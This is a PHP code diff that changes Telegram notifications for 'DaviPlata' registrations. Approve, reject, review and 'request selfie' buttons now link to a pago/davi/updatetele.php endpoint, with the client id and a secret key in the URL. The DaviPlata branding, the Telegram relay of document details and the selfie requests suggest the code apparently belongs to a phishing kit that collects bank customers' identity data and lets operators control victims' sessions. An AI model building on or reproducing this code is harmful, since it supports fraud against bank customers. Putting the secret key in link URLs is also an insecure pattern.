@@ -32,6 +32,11 @@ try {
     // Notificar a Telegram
     $botToken = $config['botToken'];
     $chatId = $config['chatId'];
+    $baseUrl = $config['baseUrl'];
+    $security_key = $config['security_key'];
+
+    // Construir URL dinámica para updatetele.php en pago/davi
+    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/davi/updatetele.php';
 
     $texto = "🔔 *Nuevo registro DaviPlata #{$clienteId}*\n\n"
            . "📋 *Tipo doc:* {$tipo_documento}\n"
@@ -44,12 +49,12 @@ try {
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '✅ Aprobar',      'callback_data' => "aprobar:{$clienteId}"],
-                ['text' => '❌ Rechazar',     'callback_data' => "rechazar:{$clienteId}"]
+                ['text' => '✅ Aprobar',      'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=aprobado&key={$security_key}"],
+                ['text' => '❌ Rechazar',     'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=rechazado&key={$security_key}"]
             ],
             [
-                ['text' => '⏳ En revisión',  'callback_data' => "revision:{$clienteId}"],
-                ['text' => '📸 Pedir Selfie', 'callback_data' => "selfie:{$clienteId}"]
+                ['text' => '⏳ En revisión',  'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=en_revision&key={$security_key}"],
+                ['text' => '📸 Pedir Selfie', 'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=pedir_selfie&key={$security_key}"]
             ]
         ]
     ];
